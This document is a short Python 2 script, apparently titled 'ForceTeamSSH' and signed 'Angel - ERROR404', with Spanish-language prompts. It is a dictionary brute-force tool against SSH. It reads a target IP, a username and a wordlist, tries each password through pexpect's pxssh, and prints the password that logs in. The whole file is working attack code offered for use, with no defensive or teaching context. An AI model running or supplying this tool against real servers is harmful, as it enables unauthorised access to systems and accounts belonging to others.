#!/usr/bin/python
# -*- coding: latin-1 -*-
#Angel - ERROR404

import sys
import time
from pexpect import pxssh

def forceteamssh(palabra):       
     	try:
        	s = pxssh.pxssh()
        	s.login (ip, usuario, palabra, login_timeout=10)
        	s.prompt()
        	print "\n",s.before
        	s.logout()
		print "\t\t\033[1;31m---------------------------------------"
		print "\t\t\033[1;31m       Contraseña :\033[1;39m ", palabra,""
		print "\t\t\033[1;31m---------------------------------------"
		
		sys.exit(1)
   	except Exception, e:
		pass
	except KeyboardInterrupt:
		sys.exit(1)

print"\033[1;39m    ______                   ______                    _________  __  __     "
print"   / ____/___  _____________/_  __/__  ____ _____ ___ / ___/ ___// / / /     "
print"  / /_  / __ \/ ___/ ___/ _ \/ / / _ \/ __ `/ __ `__ \\\__ \\__ \ / /_/ /    "
print"\033[1;31m / __/ / /_/ / /  / /__/  __/ / /  __/ /_/ / / / / / /__/ /__/ / __  /       "
print"/_/    \____/_/   \___/\___/_/  \___/\__,_/_/ /_/ /_/____/____/_/ /_/        "                                                                        
print"                           \033[1;31m  ERROR404 \033[1;31m                 \033[1;39m        ANGEL \033[1;39m        "
ip = raw_input("\033[1;31mIp: \033[1;39m")
usuario = raw_input("\033[1;31mUsuario: \033[1;39m")
diccionario=raw_input("\033[1;31mDiccionario: \033[1;39m")
try:
	diccionarios = open(diccionario, "r").readlines()
except(IOError): 
  	print "\033[1;31m\n --- \033[1;39mDiccionario No Encontrado\033[1;31m --- \n\033[1;31m"
  	sys.exit(1)
for palabra in diccionarios:
	 forceteamssh(palabra.replace("\n",""))
	 time.sleep(0.5)
